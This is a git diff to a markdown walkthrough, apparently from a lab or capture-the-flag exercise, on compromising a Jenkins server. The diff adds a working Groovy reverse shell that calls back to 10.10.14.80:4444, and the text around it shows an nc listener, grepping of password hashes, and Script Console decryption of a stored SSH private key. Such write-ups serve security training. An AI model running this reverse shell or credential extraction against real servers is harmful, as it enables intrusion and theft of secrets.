@@ -64,9 +64,13 @@ cat /var/jenkins_home/users/<user_id>/config.xml | grep passwordHash
 To obtain a reverse shell with the **Jenkins Console**, you need the **username** and **password** of a valid user. 
 Once logged in using the previously discovered credentials, you can access the **Manage Jenkins** functionality, which includes the **Script Console**.
 
-![](../../Images/Manage_Jenkins.png)
+![](../../../Images/Manage_Jenkins.png)
 
 In Jenkins, Groovy is used as the main scripting language for defining jobs and pipelines. Therefore, we are going to use the Groovy [RevShells](https://www.revshells.com/) script to obtain the reverse shell. 
+
+```bash
+String host="10.10.14.80";int port=4444;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
 
 To do this, you must first start a listener on the port where you want to receive the connection.
 
@@ -76,10 +80,10 @@ nc -lvnp 4444
 
 After that, you can run the reverse shell in the script console.
 
-![](../../Images/Script_Console_Jenkins.png)
+![](../../../Images/Script_Console_Jenkins.png)
 
 Then, you will receive the reverse shell.
-![](../../Images/script_console_jenkins_reverse_shell.png)
+![](../../../Images/script_console_jenkins_reverse_shell.png)
 
 
 ---
@@ -93,14 +97,15 @@ If the plugin is active, you can create a new Pipeline.
 
 This means that we can configure a pipeline capable of running commands over SSH in a controlled environment. First, we create a job.
 
-![](../../Images/Create_a_job_Jenkins.png)
+![](../../../Images/Create_a_job_Jenkins.png)
 
 Specifying the Pipeline item.
-![](../../Images/Pipeline_Jenkins.png)
+![](../../../Images/Pipeline_Jenkins.png)
 
 Then, in the _Pipeline Script_ section, we include the appropriate steps to execute SSH commands using the credentials managed by Jenkins.
 
-![](../../Images/Pipeline_script_jenkins.png)
+![](../../../Images/Pipeline_script_jenkins.png)
+
 ```bash
 pipeline {
     agent any
@@ -119,21 +124,21 @@ pipeline {
 ```
 
 After that, we click **Save**, and finally **Build Now**. 
-![](../../Images/Build_now_pipeline_Jenkins.png)
+![](../../../Images/Build_now_pipeline_Jenkins.png)
 
 By reviewing the Console Output, we can confirm whether the SSH connection and command execution worked correctly.
-![](../../Images/Console_output_Jenkins.png)
+![](../../../Images/Console_output_Jenkins.png)
 
 
 #### Method 2
 For this method, we need to review the existing credentials and ensure that an SSH credential object has already been created.
 
-![](Credentials_system_Jenkins.png)
-![](Update_credentials_Jenkins.png)
+![](../../../Images/Credentials_system_Jenkins.png)
+![](../../../Images/Update_credentials_Jenkins.png)
 
 Then, using the Developer Tools in our browser and inspecting the **Concealed for Confidentiality** field, we can observe how Jenkins stores and displays sensitive values in a protected format.
 
-![](Private_key_dev_tools.png)
+![](../../../Images/Private_key_dev_tools.png)
 After copying this value, we can navigate to the Jenkins Script Console at `http://10.129.230.220:8080/script` and use the following script to obtain the id_rsa.
 
 ```bash
@@ -141,4 +146,4 @@ println( hudson.util.Secret.decrypt("
 {AQAAABAAAAowLrfCrZx9ba<SNIP>ssFMcYCdYHaB1OTIcTxtaaMR8IMMaKSM=}") )
 ```
 
-![](decrypt_jenkins_result.png)
+![](../../../Images/decrypt_jenkins_result.png)
